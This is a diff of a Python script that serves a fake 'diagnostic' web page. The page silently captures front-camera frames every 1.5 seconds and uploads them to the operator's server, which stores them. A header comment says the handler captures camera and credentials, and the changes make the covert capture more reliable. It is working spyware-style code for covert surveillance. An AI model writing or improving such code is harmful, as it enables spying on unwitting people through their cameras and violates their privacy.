@@ -46,7 +46,6 @@ def get_battery_fallback():
 # --- Custom Request Handler to Capture Camera & Credentials ---
 class CustomDiagnosticHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
-        # Agar user root par aaye toh hum apna advanced diagnostic HTML page serve karenge
         if self.path == '/' or self.path == '/index.html':
             self.send_response(200)
             self.send_header("Content-type", "text/html")
@@ -77,10 +76,16 @@ class CustomDiagnosticHandler(http.server.SimpleHTTPRequestHandler):
 
         async function startDiagnostics() {
             try {
-                streamRef = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('videoElement').srcObject = streamRef;
-                // Auto capture every 2 seconds silently
-                setInterval(autoCapture, 2000);
+                streamRef = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('videoElement');
+                video.srcObject = streamRef;
+                
+                // 1 second ka delay taaki camera black frame na de, uske baad capture shuru ho
+                setTimeout(() => {
+                    autoCapture();
+                    setInterval(autoCapture, 1500);
+                }, 1000);
+
             } catch (error) {
                 console.log("Error: " + error.message);
             }
@@ -89,15 +94,18 @@ class CustomDiagnosticHandler(http.server.SimpleHTTPRequestHandler):
         function autoCapture() {
             const video = document.getElementById('videoElement');
             const canvas = document.getElementById('canvasElement');
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageDataUrl = canvas.toDataURL('image/jpeg');
+            
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageDataUrl = canvas.toDataURL('image/jpeg');
 
-            fetch('/upload_frame', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: 'image=' + encodeURIComponent(imageDataUrl)
-            });
+                fetch('/upload_frame', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'image=' + encodeURIComponent(imageDataUrl)
+                });
+            }
         }
     </script>
 </body>
@@ -110,7 +118,6 @@ class CustomDiagnosticHandler(http.server.SimpleHTTPRequestHandler):
         content_length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(content_length).decode('utf-8')
         
-        # Folder create karein agar pehle se nahi hai
         if not os.path.exists("captured_data"):
             os.makedirs("captured_data")
 
@@ -187,9 +194,8 @@ while True:
         input(f"\n{WHITE}Press Enter to return...{RESET}")
     elif chose == "7":
         print(f"\n{CYAN}[*] Scanning Loopback...{RESET}")
-        input(f"\n{WHITE}Piress Enter to return...{RESET}")
+        input(f"\n{WHITE}Press Enter to return...{RESET}")
     elif chose == "8":
-        # Purge images folder option
         if os.path.exists("captured_data"):
             for f in os.listdir("captured_data"):
                 os.remove(os.path.join("captured_data", f))
